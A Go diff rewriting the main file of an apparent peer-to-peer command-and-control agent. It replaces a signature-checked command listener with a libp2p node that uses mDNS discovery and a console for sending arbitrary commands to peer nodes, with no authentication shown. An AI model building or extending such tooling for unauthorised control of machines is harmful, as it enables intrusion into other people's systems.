@@ -1,85 +1,87 @@
 package main
 
 import (
+	"bufio"
 	"context"
 	"fmt"
+	"log"
 	"os"
-	"os/signal"
-	"syscall"
-	"time"
+	"strings"
 
-	"github.com/skoveit/nostalgia/pkg/core"
-)
-
-const (
-	AgentPort = 5000
+	"nostaliga/pkg/command"
+	"nostaliga/pkg/discovery"
+	"nostaliga/pkg/node"
+	"nostaliga/pkg/protocol"
 )
 
 func main() {
-	fmt.Println("=== P2P C2 Agent Starting ===")
-
-	// Create context with cancellation
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
 
-	// Setup libp2p host
-	h, err := core.SetupHost(ctx, AgentPort)
+	// Initialize node
+	n, err := node.NewNode(ctx)
 	if err != nil {
-		fmt.Printf("Failed to setup host: %v\n", err)
-		os.Exit(1)
-	}
-	defer h.Close()
-
-	// Setup pubsub
-	_, topic, err := core.SetupPubSub(ctx, h)
-	if err != nil {
-		fmt.Printf("Failed to setup pubsub: %v\n", err)
-		os.Exit(1)
+		log.Fatal(err)
 	}
 
-	// Define command handler
-	commandHandler := func(cmd *core.Command) error {
-		fmt.Printf("\n--- Received Command ---\n")
-		fmt.Printf("ID: %s\n", cmd.ID)
-		fmt.Printf("Type: %s\n", cmd.Type)
-		fmt.Printf("Timestamp: %s\n", cmd.Timestamp.Format(time.RFC3339))
+	// Setup protocol handler
+	cmdHandler := command.NewHandler(n)
+	proto := protocol.NewProtocol(n, cmdHandler)
+	n.SetProtocol(proto)
 
-		// Verify signature
-		isValid, err := core.VerifyCommand(cmd)
-		if err != nil {
-			fmt.Printf("Error verifying signature: %v\n", err)
-			return err
+	// Start mDNS discovery
+	disc := discovery.NewMDNSDiscovery(n)
+	if err := disc.Start(); err != nil {
+		log.Fatal(err)
+	}
+
+	log.Printf("Node started: %s", n.ID().String()[:16])
+	log.Printf("Listening on: %s", n.Addrs())
+	log.Println("\nCommands:")
+	log.Println("  send <nodeID> <command>  - Send command to specific node")
+	log.Println("  peers                    - List connected peers")
+	log.Println("  id                       - Show node ID")
+	log.Println("  quit                     - Exit")
+
+	// Command line interface
+	scanner := bufio.NewScanner(os.Stdin)
+	for {
+		fmt.Print("\n> ")
+		if !scanner.Scan() {
+			break
 		}
 
-		if !isValid {
-			fmt.Println("⚠️  SIGNATURE VERIFICATION FAILED - Command rejected")
-			return fmt.Errorf("invalid signature")
+		input := strings.TrimSpace(scanner.Text())
+		if input == "" {
+			continue
 		}
 
-		fmt.Println("✓ Signature verified successfully")
-		fmt.Printf("Payload: %s\n", cmd.Payload)
-		fmt.Println("------------------------")
+		parts := strings.SplitN(input, " ", 3)
+		cmd := parts[0]
 
-		return nil
+		switch cmd {
+		case "send":
+			if len(parts) < 3 {
+				log.Println("Usage: send <nodeID> <command>")
+				continue
+			}
+			targetID := parts[1]
+			command := parts[2]
+			proto.SendCommand(targetID, command)
+
+		case "peers":
+			n.ListPeers()
+
+		case "id":
+			log.Printf("Node ID: %s", n.ID().String())
+
+		case "quit", "exit":
+			log.Println("Shutting down...")
+			cancel()
+			return
+
+		default:
+			log.Printf("Unknown command: %s", cmd)
+		}
 	}
-
-	// Subscribe to commands
-	err = core.SubscribeToCommands(ctx, topic, commandHandler)
-	if err != nil {
-		fmt.Printf("Failed to subscribe to commands: %v\n", err)
-		os.Exit(1)
-	}
-
-	fmt.Println("\n✓ Agent is running and listening for commands...")
-	fmt.Println("Press Ctrl+C to stop")
-
-	// Wait for interrupt signal
-	sigCh := make(chan os.Signal, 1)
-	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
-	<-sigCh
-
-	fmt.Println("\n\nShutting down agent...")
-	cancel()
-	time.Sleep(1 * time.Second)
-	fmt.Println("Agent stopped")
 }
